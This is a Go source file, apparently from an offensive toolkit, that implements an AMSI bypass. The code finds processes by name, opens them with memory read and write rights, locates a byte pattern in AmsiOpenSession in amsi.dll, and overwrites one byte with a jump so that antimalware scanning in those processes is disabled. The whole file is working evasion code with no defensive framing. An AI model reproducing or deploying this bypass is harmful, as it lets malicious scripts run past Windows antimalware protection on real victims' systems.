package hook

import (
	"fmt"
	"unsafe"
	"variant/log"

	"golang.org/x/sys/windows"
)

var (
	pattern    = []byte{0x48, '?', '?', 0x74, '?', 0x48, '?', '?', 0x74}
	patch      = []byte{0xEB}
	oneMessage = true
)

func AMSIByPass(pn string) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		log.Warnf("Error creating snapshot:%v", err)
		return
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	err = windows.Process32First(snapshot, &entry)
	if err != nil {
		log.Warnf("Error getting first process:%v", err)
		return
	}

	for {
		exeFile := windows.UTF16ToString(entry.ExeFile[:])
		if exeFile == pn {
			if amigo(entry.ProcessID) {
				log.Warnf("AMSI patched %d", entry.ProcessID)
			} else {
				log.Warnf("Patch failed")
			}
		}
		err = windows.Process32Next(snapshot, &entry)
		if err != nil {
			break
		}
	}
}

func amigo(pid uint32) bool {
	const ProcessVmOperation = 0x0008
	const ProcessVmRead = 0x0010
	const ProcessVmWrite = 0x0020

	if pid == 0 {
		return false
	}

	handle, err := windows.OpenProcess(ProcessVmOperation|ProcessVmRead|ProcessVmWrite, false, pid)
	if err != nil {
		log.Warnf("Error opening process:%v", err)
		return false
	}
	defer windows.CloseHandle(handle)

	hModule, err := windows.LoadLibrary("amsi.dll")
	if err != nil {
		log.Warnf("Error loading library:%v", err)
		return false
	}
	defer windows.FreeLibrary(hModule)

	amsiAddr, err := windows.GetProcAddress(hModule, "AmsiOpenSession")
	if err != nil {
		log.Warnf("Error getting procedure address:%v", err)
		return false
	}

	buffer := make([]byte, 1024)
	var bytesRead uintptr
	err = windows.ReadProcessMemory(handle, amsiAddr, &buffer[0], 1024, &bytesRead)
	if err != nil {
		log.Warnf("Error reading process memory:%v", err)
		return false
	}

	matchAddress := searchPattern(buffer, pattern)
	if matchAddress == -1 {
		return false
	}

	if oneMessage {
		fmt.Printf("[+] AMSI address %p\n", amsiAddr)
		fmt.Printf("[+] Offset: %d\n", matchAddress)
		oneMessage = false
	}

	updateAmsiAddr := uintptr(amsiAddr) + uintptr(matchAddress)
	var bytesWritten uintptr
	err = windows.WriteProcessMemory(handle, updateAmsiAddr, &patch[0], 1, &bytesWritten)
	if err != nil {
		log.Warnf("Error writing process memory:%v", err)
		return false
	}

	return true
}

func searchPattern(buffer []byte, pattern []byte) int {
	for i := 0; i < len(buffer)-len(pattern); i++ {
		matched := true
		for j := 0; j < len(pattern); j++ {
			if pattern[j] != '?' && buffer[i+j] != pattern[j] {
				matched = false
				break
			}
		}
		if matched {
			return i + 3
		}
	}
	return -1
}
